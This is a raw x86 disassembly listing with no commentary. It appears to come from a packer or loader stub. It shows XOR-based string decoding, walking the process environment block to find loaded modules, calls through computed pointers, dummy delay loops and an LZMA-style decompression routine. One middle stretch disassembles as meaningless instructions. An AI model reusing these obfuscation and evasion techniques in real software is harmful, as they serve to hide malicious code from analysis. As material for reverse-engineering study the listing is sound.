  425496:	mov    ecx,DWORD PTR [eax+0x18c]
  42549c:	xor    eax,eax
  42549e:	cmp    DWORD PTR [ecx],eax
  4254a0:	jne    0x425712
  4254a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4254a9:	mov    ecx,DWORD PTR [ecx+0x17c]
  4254af:	mov    DWORD PTR [ecx],eax
  4254b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4254b4:	mov    ecx,DWORD PTR [ecx+0x180]
  4254ba:	mov    DWORD PTR [ecx],eax
  4254bc:	mov    eax,0x4e61
  4254c1:	mov    WORD PTR [ebp-0x9c],ax
  4254c8:	mov    eax,esi
  4254ca:	mov    WORD PTR [ebp-0x9a],ax
  4254d1:	mov    eax,0x4e71
  4254d6:	mov    WORD PTR [ebp-0x98],ax
  4254dd:	add    eax,0xffffffc0
  4254e0:	mov    WORD PTR [ebp-0x96],ax
  4254e7:	mov    eax,0x4f8e
  4254ec:	mov    WORD PTR [ebp-0x94],ax
  4254f3:	mov    eax,0x4e32
  4254f8:	mov    WORD PTR [ebp-0x92],ax
  4254ff:	add    eax,0x4d
  425502:	mov    WORD PTR [ebp-0x90],ax
  425509:	mov    eax,0x4e34
  42550e:	mov    WORD PTR [ebp-0x8e],ax
  425515:	mov    eax,esi
  425517:	mov    WORD PTR [ebp-0x8c],ax
  42551e:	mov    eax,0x4e35
  425523:	mov    WORD PTR [ebp-0x8a],ax
  42552a:	mov    eax,0x99f1
  42552f:	mov    WORD PTR [ebp-0x88],ax
  425536:	mov    eax,0x8d62
  42553b:	mov    WORD PTR [ebp-0x86],ax
  425542:	mov    eax,0xd66f
  425547:	mov    WORD PTR [ebp-0x84],ax
  42554e:	mov    eax,0xd783
  425553:	mov    WORD PTR [ebp-0x82],ax
  42555a:	mov    eax,0x2784
  42555f:	mov    WORD PTR [ebp-0x80],ax
  425563:	mov    eax,0x4784
  425568:	mov    WORD PTR [ebp-0x7e],ax
  42556c:	mov    eax,0x4e33
  425571:	push   0x8
  425573:	mov    WORD PTR [ebp-0x7c],ax
  425577:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42557e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  425585:	lea    eax,[ebp-0x10]
  425588:	pop    ecx
  425589:	mov    dl,BYTE PTR [eax]
  42558b:	xor    dl,0x7c
  42558e:	inc    dl
  425590:	mov    BYTE PTR [eax],dl
  425592:	inc    eax
  425593:	dec    ecx
  425594:	jne    0x425589
  425596:	lea    eax,[ebp-0x10]
  425599:	mov    DWORD PTR [ebp-0xdc],eax
  42559f:	lea    eax,[ebp-0xe0]
  4255a5:	push   eax
  4255a6:	mov    eax,DWORD PTR [ebp+0xc]
  4255a9:	xor    eax,edi
  4255ab:	add    eax,ebx
  4255ad:	push   eax
  4255ae:	mov    eax,DWORD PTR [ebp-0x4]
  4255b1:	add    eax,0x66
  4255b4:	push   eax
  4255b5:	mov    eax,DWORD PTR [ebp-0x4]
  4255b8:	mov    eax,DWORD PTR [eax+0x198]
  4255be:	mov    DWORD PTR [ebp-0xe0],0x1
  4255c8:	push   DWORD PTR [eax]
  4255ca:	mov    eax,DWORD PTR [ebp+0x10]
  4255cd:	call   eax
  4255cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4255d2:	xor    ecx,edi
  4255d4:	add    ecx,ebx
  4255d6:	mov    DWORD PTR [ebp-0x8],eax
  4255d9:	cmp    eax,ecx
  4255db:	jne    0x4255f6
  4255dd:	mov    eax,ds:0x33730bcc
  4255e2:	or     eax,0x22150bcf
  4255e7:	mov    ds:0x33730bcc,eax
  4255ec:	add    eax,0x3372e92f
  4255f1:	mov    ds:0x33730bcc,eax
  4255f6:	mov    ecx,0x4e66
  4255fb:	mov    eax,ecx
  4255fd:	mov    WORD PTR [ebp-0x40],ax
  425601:	add    eax,0x5
  425604:	mov    edx,eax
  425606:	mov    WORD PTR [ebp-0x3e],dx
  42560a:	mov    edx,0x4f93
  42560f:	mov    WORD PTR [ebp-0x3c],dx
  425613:	add    edx,0xfffffff8
  425616:	mov    WORD PTR [ebp-0x3a],dx
  42561a:	mov    edx,0x4f8d
  42561f:	mov    WORD PTR [ebp-0x38],dx
  425623:	add    edx,0xfffffff3
  425626:	mov    WORD PTR [ebp-0x36],dx
  42562a:	mov    edx,0x4f87
  42562f:	mov    WORD PTR [ebp-0x34],dx
  425633:	mov    WORD PTR [ebp-0x32],cx
  425637:	mov    ecx,esi
  425639:	mov    WORD PTR [ebp-0x30],cx
  42563d:	lea    ecx,[edx-0x1]
  425640:	mov    edx,ecx
  425642:	mov    WORD PTR [ebp-0x54],dx
  425646:	mov    edx,eax
  425648:	mov    WORD PTR [ebp-0x52],dx
  42564c:	mov    edx,0x4e73
  425651:	mov    WORD PTR [ebp-0x50],dx
  425655:	mov    WORD PTR [ebp-0x4e],ax
  425659:	lea    eax,[edx-0x6]
  42565c:	mov    WORD PTR [ebp-0x4c],ax
  425660:	add    eax,0xfffffff3
  425663:	mov    WORD PTR [ebp-0x4a],ax
  425667:	lea    eax,[edx-0xc]
  42566a:	mov    WORD PTR [ebp-0x48],ax
  42566e:	mov    WORD PTR [ebp-0x46],cx
  425672:	mov    WORD PTR [ebp-0x44],si
  425676:	mov    eax,DWORD PTR [ebp+0x8]
  425679:	movzx  ecx,WORD PTR [ebp-0x54]
  42567d:	xor    eax,edi
  42567f:	add    eax,ebx
  425681:	xor    eax,ecx
  425683:	mov    WORD PTR [ebp-0x54],ax
  425687:	mov    eax,DWORD PTR [ebp+0x8]
  42568a:	movzx  ecx,WORD PTR [ebp-0x40]
  42568e:	xor    eax,edi
  425690:	add    eax,ebx
  425692:	xor    eax,ecx
  425694:	mov    WORD PTR [ebp-0x40],ax
  425698:	xor    eax,eax
  42569a:	mov    WORD PTR [ebp-0xf4],ax
  4256a1:	mov    WORD PTR [ebp-0x108],ax
  4256a8:	mov    edi,DWORD PTR [ebp+0x24]
  4256ab:	lea    eax,[ebp-0xf4]
  4256b1:	lea    edx,[ebp-0x54]
  4256b4:	mov    DWORD PTR [ebp-0xe0],0x2
  4256be:	mov    DWORD PTR [ebp-0xdc],eax
  4256c4:	call   0x4280fb
  4256c9:	mov    DWORD PTR [ebp-0xd8],eax
  4256cf:	lea    eax,[ebp-0xe0]
  4256d5:	push   eax
  4256d6:	mov    eax,DWORD PTR [ebp+0xc]
  4256d9:	xor    eax,0x75108aa
  4256de:	add    eax,ebx
  4256e0:	push   eax
  4256e1:	lea    eax,[ebp-0x9c]
  4256e7:	push   eax
  4256e8:	push   DWORD PTR [ebp-0x8]
  4256eb:	mov    eax,DWORD PTR [ebp+0x10]
  4256ee:	call   eax
  4256f0:	mov    edi,DWORD PTR [ebp+0x24]
  4256f3:	lea    eax,[ebp-0x108]
  4256f9:	lea    edx,[ebp-0x40]
  4256fc:	mov    DWORD PTR [ebp-0xdc],eax
  425702:	call   0x4280fb
  425707:	mov    DWORD PTR [ebp-0xd8],eax
  42570d:	mov    edi,0x75108aa
  425712:	mov    eax,DWORD PTR [ebp+0x14]
  425715:	push   DWORD PTR [ebp-0x4]
  425718:	push   DWORD PTR [ebp+0x20]
  42571b:	push   DWORD PTR [ebp+0x1c]
  42571e:	push   DWORD PTR [ebp+0x18]
  425721:	push   DWORD PTR [ebp+0x10]
  425724:	push   DWORD PTR [ebp+0x8]
  425727:	push   DWORD PTR [ebp+0xc]
  42572a:	call   0x42699c
  42572f:	test   eax,eax
  425731:	je     0x425775
  425733:	add    DWORD PTR [ebp-0x4],eax
  425736:	push   DWORD PTR [ebp-0x4]
  425739:	lea    esi,[ebp+0x4]
  42573c:	call   0x425b8d
  425741:	mov    eax,DWORD PTR [ebp-0x4]
  425744:	mov    eax,DWORD PTR [eax+0x1c8]
  42574a:	mov    eax,DWORD PTR [eax]
  42574c:	xor    eax,edi
  42574e:	add    eax,ebx
  425750:	mov    eax,DWORD PTR [ebp-0x4]
  425753:	jne    0x42576b
  425755:	mov    ecx,DWORD PTR [ebp-0x4]
  425758:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42575e:	push   DWORD PTR [ecx]
  425760:	mov    eax,DWORD PTR [eax+0x1e0]
  425766:	call   DWORD PTR [eax+0x28]
  425769:	jmp    0x425775
  42576b:	mov    eax,DWORD PTR [eax+0x17c]
  425771:	mov    eax,DWORD PTR [eax]
  425773:	add    DWORD PTR [esi],eax
  425775:	mov    eax,DWORD PTR [ebp-0x4]
  425778:	mov    eax,DWORD PTR [eax+0x1dc]
  42577e:	dec    DWORD PTR [eax]
  425780:	mov    ecx,DWORD PTR [ebp-0x4]
  425783:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425789:	mov    eax,DWORD PTR [eax]
  42578b:	lea    eax,[ecx+eax*4]
  42578e:	mov    ecx,DWORD PTR [ebp-0x4]
  425791:	mov    ecx,DWORD PTR [ecx+0x17c]
  425797:	mov    eax,DWORD PTR [eax]
  425799:	mov    ecx,DWORD PTR [ecx]
  42579b:	add    DWORD PTR [eax],ecx
  42579d:	pop    edi
  42579e:	pop    esi
  42579f:	pop    ebx
  4257a0:	leave  
  4257a1:	ret    0x20
  4257a4:	push   edi
  4257a5:	push   esi
  4257a6:	push   ebx
  4257a7:	push   ebp
  4257a8:	mov    ebp,esp
  4257aa:	mov    eax,DWORD PTR [ebp+0x24]
  4257ad:	add    DWORD PTR [ebp+0x28],eax
  4257b0:	push   eax
  4257b1:	cld    
  4257b2:	mov    esi,DWORD PTR [ebp+0x18]
  4257b5:	add    DWORD PTR [ebp+0x1c],esi
  4257b8:	push   esi
  4257b9:	mov    esi,DWORD PTR [ebp+0x14]
  4257bc:	lods   eax,DWORD PTR ds:[esi]
  4257bd:	xchg   edx,eax
  4257be:	push   edx
  4257bf:	mov    cl,BYTE PTR [esi-0x2]
  4257c2:	or     eax,0xffffffff
  4257c5:	shl    eax,cl
  4257c7:	not    eax
  4257c9:	push   eax
  4257ca:	mov    cl,dh
  4257cc:	or     eax,0xffffffff
  4257cf:	shl    eax,cl
  4257d1:	not    eax
  4257d3:	push   eax
  4257d4:	add    cl,dl
  4257d6:	mov    edi,esi
  4257d8:	sub    esp,0xc
  4257db:	sub    eax,eax
  4257dd:	inc    eax
  4257de:	push   eax
  4257df:	push   eax
  4257e0:	push   eax
  4257e1:	push   eax
  4257e2:	push   eax
  4257e3:	push   edi
  4257e4:	sub    esi,esi
  4257e6:	push   esi
  4257e7:	or     ebx,0xffffffff
  4257ea:	mov    eax,0x300
  4257ef:	shl    eax,cl
  4257f1:	lea    ecx,[eax+0x736]
  4257f7:	mov    eax,0x4000400
  4257fc:	shr    ecx,1
  4257fe:	rep stos DWORD PTR es:[edi],eax
  425800:	push   0x5
  425802:	pop    ecx
  425803:	call   0x425aee
  425808:	loop   0x425803
  42580a:	lea    esi,[esi]
  42580c:	lea    edi,[edi]
  42580e:	mov    edi,DWORD PTR [ebp-0x4]
  425811:	mov    eax,DWORD PTR [ebp-0x10]
  425814:	sub    edi,DWORD PTR [ebp+0x24]
  425817:	and    eax,edi
  425819:	mov    DWORD PTR [ebp-0x18],eax
  42581c:	mov    al,0x0
  42581e:	call   0x425b06
  425823:	jne    0x4258be
  425829:	mov    cl,BYTE PTR [ebp-0xc]
  42582c:	and    edi,DWORD PTR [ebp-0x14]
  42582f:	shl    edi,cl
  425831:	sub    cl,0x8
  425834:	neg    cl
  425836:	shr    esi,cl
  425838:	pop    eax
  425839:	add    edi,esi
  42583b:	pop    esi
  42583c:	lea    edi,[edi+edi*2]
  42583f:	shl    edi,0x8
  425842:	cmp    al,0x7
  425844:	pop    edx
  425845:	lea    ecx,[esi+edi*2+0xe6c]
  42584c:	push   ecx
  42584d:	push   esi
  42584e:	mov    esi,0x100
  425853:	push   eax
  425854:	mov    al,0x1
  425856:	jb     0x42588c
  425858:	mov    edi,DWORD PTR [ebp-0x4]
  42585b:	sub    edi,DWORD PTR [ebp-0x24]
  42585e:	movzx  edi,BYTE PTR [edi]
  425861:	mov    ebp,DWORD PTR [ebp-0x34]
  425864:	shl    edi,1
  425866:	mov    ecx,esi
  425868:	and    esi,edi
  42586a:	add    ecx,esi
  42586c:	lea    ebp,[ebp+ecx*2+0x0]
  425870:	call   0x425b25
  425875:	mov    ecx,eax
  425877:	shr    esi,0x8
  42587a:	and    ecx,0x1
  42587d:	cmp    esi,ecx
  42587f:	mov    esi,0x100
  425884:	jne    0x425894
  425886:	cmp    eax,esi
  425888:	jb     0x425861
  42588a:	jmp    0x4258a0
  42588c:	mov    ebp,DWORD PTR [ebp-0x34]
  42588f:	call   0x425b25
  425894:	inc    eax
  425895:	inc    esi
  425896:	sub    eax,0x1
  425899:	sub    esi,0x1
  42589c:	cmp    eax,esi
  42589e:	jb     0x42588c
  4258a0:	pop    edx
  4258a1:	inc    edx
  4258a2:	cmp    edx,0x5
  4258a5:	dec    edx
  4258a6:	mov    ecx,edx
  4258a8:	jb     0x4258b9
  4258aa:	inc    edx
  4258ab:	cmp    edx,0xb
  4258ae:	dec    edx
  4258af:	mov    cl,0x4
  4258b1:	dec    cl
  4258b3:	jb     0x4258b9
  4258b5:	mov    cl,0x7
  4258b7:	dec    cl
  4258b9:	sub    edx,ecx
  4258bb:	push   edx
  4258bc:	jmp    0x42590d
  4258be:	mov    al,0xc1
  4258c0:	dec    al
  4258c2:	call   0x425b16
  4258c7:	jne    0x4258dd
  4258c9:	pop    eax
  4258ca:	pop    edi
  4258cb:	pop    edx
  4258cc:	pop    ecx
  4258cd:	pop    edx
  4258ce:	pop    ecx
  4258cf:	push   DWORD PTR [esp]
  4258d2:	push   ecx
  4258d3:	push   edx
  4258d4:	mov    edx,0x664
  4258d9:	mov    cl,0x0
  4258db:	jmp    0x425950
  4258dd:	mov    al,0xcd
  4258df:	dec    al
  4258e1:	call   0x425b16
  4258e6:	jne    0x425916
  4258e8:	mov    al,0xf1
  4258ea:	dec    al
  4258ec:	call   0x425b06
  4258f1:	jne    0x425946
  4258f3:	pop    eax
  4258f4:	cmp    al,0x7
  4258f6:	mov    al,0x9
  4258f8:	jb     0x4258fc
  4258fa:	mov    al,0xb
  4258fc:	push   eax
  4258fd:	mov    esi,DWORD PTR [ebp-0x4]
  425900:	sub    esi,DWORD PTR [ebp-0x24]
  425903:	cmp    esi,DWORD PTR [ebp+0x24]
  425906:	jb     0x425add
  42590c:	lods   al,BYTE PTR ds:[esi]
  42590d:	mov    edi,DWORD PTR [ebp-0x4]
  425910:	stos   BYTE PTR es:[edi],al
  425911:	jmp    0x425aa4
  425916:	mov    al,0xd8
  425918:	call   0x425b16
  42591d:	mov    esi,DWORD PTR [ebp-0x28]
  425920:	je     0x42593d
  425922:	mov    al,0xe4
  425924:	call   0x425b16
  425929:	mov    esi,DWORD PTR [ebp-0x2c]
  42592c:	je     0x425937
  42592e:	mov    esi,DWORD PTR [ebp-0x30]
  425931:	mov    ecx,DWORD PTR [ebp-0x2c]
  425934:	mov    DWORD PTR [ebp-0x30],ecx
  425937:	mov    ecx,DWORD PTR [ebp-0x28]
  42593a:	mov    DWORD PTR [ebp-0x2c],ecx
  42593d:	mov    ecx,DWORD PTR [ebp-0x24]
  425940:	mov    DWORD PTR [ebp-0x28],ecx
  425943:	mov    DWORD PTR [ebp-0x24],esi
  425946:	pop    eax
  425947:	pop    edi
  425948:	pop    ecx
  425949:	mov    edx,0xa68
  42594e:	mov    cl,0x8
  425950:	add    edx,edi
  425952:	push   edx
  425953:	push   edi
  425954:	cmp    al,0x7
  425956:	mov    al,cl
  425958:	jb     0x42595c
  42595a:	add    al,0x3
  42595c:	push   eax
  42595d:	mov    ebp,DWORD PTR [ebp-0x34]
  425960:	call   0x425b23
  425965:	jne    0x42597b
  425967:	mov    eax,DWORD PTR [ebp-0x18]
  42596a:	mov    edi,DWORD PTR [ebp-0x34]
  42596d:	shl    eax,0x3
  425970:	sub    ecx,ecx
  425972:	push   0x8
  425974:	pop    esi
  425975:	lea    edi,[edi+eax*2+0x4]
  425979:	jmp    0x4259b0
  42597b:	mov    ebp,DWORD PTR [ebp-0x34]
  42597e:	add    ebp,0x2
  425981:	call   0x425b23
  425986:	jne    0x4259a0
  425988:	mov    eax,DWORD PTR [ebp-0x18]
  42598b:	mov    edi,DWORD PTR [ebp-0x34]
  42598e:	shl    eax,0x3
  425991:	push   0x8
  425993:	pop    ecx
  425994:	push   0x8
  425996:	pop    esi
  425997:	lea    edi,[edi+eax*2+0x104]
  42599e:	jmp    0x4259b0
  4259a0:	mov    edi,0x204
  4259a5:	add    edi,DWORD PTR [ebp-0x34]
  4259a8:	push   0x10
  4259aa:	pop    ecx
  4259ab:	mov    esi,0x100
  4259b0:	mov    DWORD PTR [ebp-0x1c],ecx
  4259b3:	sub    eax,eax
  4259b5:	inc    eax
  4259b6:	mov    ebp,edi
  4259b8:	call   0x425b25
  4259bd:	mov    ecx,eax
  4259bf:	sub    ecx,esi
  4259c1:	jb     0x4259b6
  4259c3:	add    DWORD PTR [ebp-0x1c],ecx
  4259c6:	cmp    DWORD PTR [ebp-0x3c],0x4
  4259ca:	jae    0x425a80
  4259d0:	add    DWORD PTR [ebp-0x3c],0x7
  4259d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4259d7:	cmp    ecx,0x4
  4259da:	jb     0x4259df
  4259dc:	push   0x3
  4259de:	pop    ecx
  4259df:	mov    edi,DWORD PTR [ebp-0x38]
  4259e2:	shl    ecx,0x6
  4259e5:	sub    eax,eax
  4259e7:	inc    eax
  4259e8:	push   0x40
  4259ea:	pop    esi
  4259eb:	lea    edi,[edi+ecx*2+0x360]
  4259f2:	mov    ebp,edi
  4259f4:	call   0x425b25
  4259f9:	mov    ecx,eax
  4259fb:	sub    ecx,esi
  4259fd:	jb     0x4259f2
  4259ff:	mov    DWORD PTR [ebp-0x18],ecx
  425a02:	mov    DWORD PTR [ebp-0x24],ecx
  425a05:	cmp    ecx,0x4
  425a08:	jb     0x425a7d
  425a0a:	mov    esi,ecx
  425a0c:	and    DWORD PTR [ebp-0x24],0x1
  425a10:	shr    esi,1
  425a12:	or     DWORD PTR [ebp-0x24],0x2
  425a16:	dec    esi
  425a17:	cmp    ecx,0xe
  425a1a:	jae    0x425a35
  425a1c:	mov    eax,0x2af
  425a21:	sub    eax,ecx
  425a23:	mov    ecx,esi
  425a25:	shl    BYTE PTR [ebp-0x24],cl
  425a28:	add    eax,DWORD PTR [ebp-0x24]
  425a2b:	shl    eax,1
  425a2d:	add    eax,DWORD PTR [ebp-0x38]
  425a30:	mov    DWORD PTR [ebp-0x34],eax
  425a33:	jmp    0x425a62
  425a35:	sub    esi,0x4
  425a38:	call   0x425ae2
  425a3d:	shr    ebx,1
  425a3f:	shl    DWORD PTR [ebp-0x24],1
  425a42:	cmp    DWORD PTR [ebp-0x20],ebx
  425a45:	jb     0x425a4d
  425a47:	inc    DWORD PTR [ebp-0x24]
  425a4a:	sub    DWORD PTR [ebp-0x20],ebx
  425a4d:	dec    esi
  425a4e:	jne    0x425a38
  425a50:	mov    eax,0x644
  425a55:	add    eax,DWORD PTR [ebp-0x38]
  425a58:	mov    DWORD PTR [ebp-0x34],eax
  425a5b:	shl    DWORD PTR [ebp-0x24],0x4
  425a5f:	push   0x4
  425a61:	pop    esi
  425a62:	sub    edi,edi
  425a64:	inc    edi
  425a65:	mov    eax,edi
  425a67:	mov    ebp,DWORD PTR [ebp-0x34]
  425a6a:	call   0x425b25
  425a6f:	test   al,0x1
  425a71:	je     0x425a76
  425a73:	or     DWORD PTR [ebp-0x24],edi
  425a76:	shl    edi,1
  425a78:	dec    esi
  425a79:	jne    0x425a67
  425a7b:	jmp    0x425a7d
  425a7d:	inc    DWORD PTR [ebp-0x24]
  425a80:	mov    ecx,DWORD PTR [ebp-0x1c]
  425a83:	add    ecx,0x2
  425a86:	mov    edi,DWORD PTR [ebp-0x4]
  425a89:	mov    eax,edi
  425a8b:	sub    eax,DWORD PTR [ebp+0x24]
  425a8e:	cmp    DWORD PTR [ebp-0x24],eax
  425a91:	ja     0x425add
  425a93:	mov    esi,edi
  425a95:	sub    esi,DWORD PTR [ebp-0x24]
  425a98:	mov    edx,DWORD PTR [ebp+0x28]
  425a9b:	lods   al,BYTE PTR ds:[esi]
  425a9c:	stos   BYTE PTR es:[edi],al
  425a9d:	cmp    edi,edx
  425a9f:	jae    0x425aa4
  425aa1:	dec    ecx
  425aa2:	jne    0x425a9b
  425aa4:	mov    DWORD PTR [ebp-0x4],edi
  425aa7:	movzx  esi,al
  425aaa:	cmp    edi,DWORD PTR [ebp+0x28]
  425aad:	jb     0x42580e
  425ab3:	call   0x425ae2
  425ab8:	sub    eax,eax
  425aba:	lea    ebp,[esp+0x3c]
  425abe:	mov    edx,DWORD PTR [ebp+0x20]
  425ac1:	mov    esi,DWORD PTR [ebp-0x8]
  425ac4:	sub    esi,DWORD PTR [ebp+0x18]
  425ac7:	mov    DWORD PTR [edx],esi
  425ac9:	mov    edx,DWORD PTR [ebp+0x2c]
  425acc:	mov    edi,DWORD PTR [ebp-0x4]
  425acf:	sub    edi,DWORD PTR [ebx+0x16]
  425ad2:	lods   al,BYTE PTR ds:[esi]
  425ad3:	outs   dx,BYTE PTR ds:[esi]
  425ad4:	lods   eax,DWORD PTR ds:[esi]
  425ad5:	repz inc DWORD PTR [ebx]
  425ad8:	xchg   ecx,eax
  425ad9:	test   BYTE PTR [esi-0x76cd1801],0x87
  425ae0:	xor    eax,0x86758ce9
  425ae5:	xchg   BYTE PTR [esi-0x6a75b076],al
  425aeb:	lea    edx,ds:0x5bb4dfa6
  425af1:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  425af8:	fwait
  425af9:	or     DWORD PTR [ebp-0x53c759f7],ecx
  425aff:	fwait
  425b00:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  425b07:	mov    ebx,0x8960c299
  425b0c:	lea    ecx,ds:0x299b9296
  425b12:	xchg   edx,eax
  425b13:	lea    esi,ds:0x8960c29e
  425b19:	xchg   edx,eax
  425b1a:	fwait
  425b1b:	cdq    
  425b1c:	mov    ah,0x3b
  425b1e:	test   eax,0x869b37bc
  425b23:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425b29:	mov    WORD PTR [ebp-0x7a],?
  425b2c:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425b32:	mov    bh,0x16
  425b34:	lea    dx,[edi]
  425b37:	push   ss
  425b38:	push   es
  425b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b3a:	jb     0x425af3
  425b3c:	push   ss
  425b3d:	not    DWORD PTR [ebx-0x8]
  425b40:	mov    al,0xca
  425b42:	test   DWORD PTR [edi+0x158d6616],edx
  425b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b49:	test   al,0xd7
  425b4b:	push   ss
  425b4c:	push   es
  425b4d:	mov    ah,0xb5
  425b4f:	ret    0x55b7
  425b52:	add    cl,al
  425b54:	jmp    0xcaf16a64
  425b59:	cmp    DWORD PTR [esp+0x20],ecx
  425b5d:	jae    0x425b76
  425b5f:	mov    ebx,ecx
  425b61:	mov    ecx,0x800
  425b66:	sub    ecx,edx
  425b68:	shr    ecx,0x5
  425b6b:	add    WORD PTR [ebp+0x0],cx
  425b6f:	add    eax,eax
  425b71:	lea    ebp,[esp+0x40]
  425b75:	ret    
  425b76:	shr    edx,0x5
  425b79:	sub    DWORD PTR [esp+0x20],ecx
  425b7d:	sub    ebx,ecx
  425b7f:	sub    WORD PTR [ebp+0x0],dx
  425b83:	add    eax,eax
  425b85:	add    eax,0x1
  425b88:	lea    ebp,[esp+0x40]
  425b8c:	ret    
  425b8d:	push   ebp
  425b8e:	mov    ebp,esp
  425b90:	sub    esp,0x12c
  425b96:	push   ebx
  425b97:	push   esi
  425b98:	push   edi
  425b99:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425ba0:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425ba7:	mov    eax,DWORD PTR [ebp+0x8]
  425baa:	mov    DWORD PTR [ebp+0x8],eax
  425bad:	mov    ecx,DWORD PTR [ebp-0x10]
  425bb0:	mov    ebx,0x75108aa
  425bb5:	xor    ecx,ebx
  425bb7:	mov    eax,0x3272f1
  425bbc:	add    ecx,eax
  425bbe:	mov    DWORD PTR [ebp-0x24],ecx
  425bc1:	mov    ecx,DWORD PTR [ebp-0x10]
  425bc4:	xor    ecx,ebx
  425bc6:	add    ecx,eax
  425bc8:	mov    DWORD PTR [ebp-0x40],ecx
  425bcb:	mov    ecx,DWORD PTR [ebp-0x10]
  425bce:	xor    ecx,ebx
  425bd0:	add    ecx,eax
  425bd2:	mov    DWORD PTR [ebp-0x3c],ecx
  425bd5:	mov    ecx,DWORD PTR [ebp-0x10]
  425bd8:	xor    ecx,ebx
  425bda:	add    ecx,eax
  425bdc:	mov    DWORD PTR [ebp-0xd8],ecx
  425be2:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425be9:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425bf0:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425bf7:	push   0x25
  425bf9:	pop    ecx
  425bfa:	mov    DWORD PTR [ebp-0x30],ecx
  425bfd:	mov    DWORD PTR [ebp-0x30],ecx
  425c00:	push   0x65
  425c02:	pop    ecx
  425c03:	mov    DWORD PTR [ebp-0x30],ecx
  425c06:	mov    DWORD PTR [ebp-0x30],ecx
  425c09:	mov    DWORD PTR [ebp-0x30],0x4d
  425c10:	mov    DWORD PTR [ebp-0x30],0x43
  425c17:	mov    ecx,DWORD PTR [ebp-0x10]
  425c1a:	xor    ecx,ebx
  425c1c:	add    ecx,eax
  425c1e:	mov    DWORD PTR [ebp-0x30],ecx
  425c21:	mov    ecx,DWORD PTR [ebp-0x10]
  425c24:	xor    ecx,ebx
  425c26:	add    ecx,eax
  425c28:	mov    DWORD PTR [ebp-0x30],ecx
  425c2b:	mov    DWORD PTR [ebp-0x28],0x258
  425c32:	mov    DWORD PTR [ebp-0x34],0x36
  425c39:	mov    DWORD PTR [ebp-0x14],0x7a
  425c40:	lea    edi,[ebp-0x10c]
  425c46:	lea    esi,[ebp-0x12c]
  425c4c:	call   0x42690b
  425c51:	dec    DWORD PTR [ebp-0x14]
  425c54:	jne    0x425c40
  425c56:	dec    DWORD PTR [ebp-0x34]
  425c59:	jne    0x425c39
  425c5b:	dec    DWORD PTR [ebp-0x28]
  425c5e:	jne    0x425c32
  425c60:	mov    DWORD PTR [ebp-0x28],0x400e
  425c67:	mov    eax,DWORD PTR [ebp-0x10]
  425c6a:	xor    eax,ebx
  425c6c:	mov    esi,0x3272f1
  425c71:	add    eax,esi
  425c73:	mov    DWORD PTR [ebp-0x1c],eax
  425c76:	mov    eax,DWORD PTR [ebp-0x10]
  425c79:	and    DWORD PTR [ebp-0x94],0x0
  425c80:	xor    eax,ebx
  425c82:	add    eax,esi
  425c84:	mov    DWORD PTR [ebp-0x38],eax
  425c87:	mov    eax,fs:0x18
  425c8d:	mov    DWORD PTR [ebp-0x94],eax
  425c93:	mov    eax,DWORD PTR [eax+0x30]
  425c96:	mov    DWORD PTR [ebp-0xcc],eax
  425c9c:	mov    eax,DWORD PTR [eax+0xc]
  425c9f:	mov    DWORD PTR [ebp-0xc0],eax
  425ca5:	mov    eax,DWORD PTR [ebp+0x8]
  425ca8:	lea    ecx,[ebp-0x94]
  425cae:	mov    DWORD PTR [eax+0x1a0],ecx
  425cb4:	mov    eax,DWORD PTR [ebp+0x8]
  425cb7:	lea    ecx,[ebp-0xcc]
  425cbd:	mov    DWORD PTR [eax+0x1a4],ecx
  425cc3:	mov    eax,DWORD PTR [ebp+0x8]
  425cc6:	push   DWORD PTR [ebp+0x8]
  425cc9:	lea    ecx,[ebp-0xc0]
  425ccf:	mov    DWORD PTR [eax+0x1a8],ecx
  425cd5:	call   0x4280cc
  425cda:	mov    ecx,DWORD PTR [ebp-0x10]
  425cdd:	xor    ecx,ebx
  425cdf:	add    ecx,esi
  425ce1:	cmp    ecx,eax
  425ce3:	je     0x426066
  425ce9:	mov    eax,DWORD PTR [ebp+0x8]
  425cec:	mov    eax,DWORD PTR [eax+0x194]
  425cf2:	mov    ecx,DWORD PTR [eax]
  425cf4:	mov    eax,DWORD PTR [ebp+0x8]
  425cf7:	mov    eax,DWORD PTR [eax+0x194]
  425cfd:	mov    eax,DWORD PTR [eax]
  425cff:	add    eax,DWORD PTR [ecx+0x3c]
  425d02:	mov    ecx,DWORD PTR [ebp+0x8]
  425d05:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425d0b:	lea    edx,[ebp-0xec]
  425d11:	push   edx
  425d12:	mov    edx,DWORD PTR [ebp+0x8]
  425d15:	mov    edx,DWORD PTR [edx+0x18c]
  425d1b:	mov    edx,DWORD PTR [edx]
  425d1d:	add    edx,DWORD PTR [eax+0x88]
  425d23:	push   0x4
  425d25:	push   DWORD PTR [eax+0x8c]
  425d2b:	push   edx
  425d2c:	call   DWORD PTR [ecx+0x1c]
  425d2f:	push   DWORD PTR [ebp+0x8]
  425d32:	xor    eax,eax
  425d34:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425d3e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425d48:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425d52:	mov    BYTE PTR [ebp-0x9c],0x83
  425d59:	lea    edi,[ebp-0x9b]
  425d5f:	stos   DWORD PTR es:[edi],eax
  425d60:	stos   WORD PTR es:[edi],ax
  425d62:	stos   BYTE PTR es:[edi],al
  425d63:	xor    eax,eax
  425d65:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425d6f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
